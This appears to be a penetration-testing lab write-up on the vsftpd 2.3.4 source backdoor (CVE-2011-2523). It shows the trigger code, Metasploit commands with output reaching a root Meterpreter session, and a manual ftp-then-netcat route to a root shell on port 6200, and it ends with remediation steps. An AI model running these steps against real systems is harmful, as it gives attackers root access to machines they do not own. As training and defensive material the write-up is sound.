# 04 — vsftpd 2.3.4 Backdoor Exploit

## Vulnerability Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2011-2523 |
| CVSS Score | 10.0 (Critical) |
| Affected Version | vsftpd 2.3.4 |
| Type | Supply Chain Attack + Backdoor |
| Access Gained | Root shell via port 6200 |

---

## How the Backdoor Works

In 2011, an attacker compromised the official vsftpd source tarball and inserted malicious code. If a username contains `:)` (smiley face), the FTP daemon opens a **root shell on port 6200**.

```c
if (p_buf[i] == 0x3A && p_buf[i+1] == 0x29) {  // ':' and ')'
    vsf_sysutil_extra();   // Opens root shell on port 6200
}
```

---

## Exploitation via Metasploit

```bash
msfconsole
search vsftpd
use 1                              # exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.1.50
set LHOST 192.168.1.80
exploit
```

### Actual Output:
```
[*] Started reverse TCP handler on 192.168.1.80:4444
[*] FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] The target appears to be vulnerable
[+] Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.1.80:4444 → 192.168.1.50:47384)

meterpreter > getuid
Server username: root
```
✅ **Root shell obtained via Meterpreter!**

---

## Manual Exploitation (Without Metasploit)

**Terminal 1 — Trigger the backdoor:**
```bash
ftp 192.168.1.50
# Username: megha:)
# Password: anything
# Connection will hang — backdoor is now open on port 6200
```

**Terminal 2 — Connect to backdoor:**
```bash
nc 192.168.1.50 6200
whoami
# root
```

---

## Remediation
1. Upgrade vsftpd beyond version 2.3.4
2. Verify software checksums (SHA256) before installing
3. Block port 6200 at the firewall
4. Use intrusion detection for unusual port openings
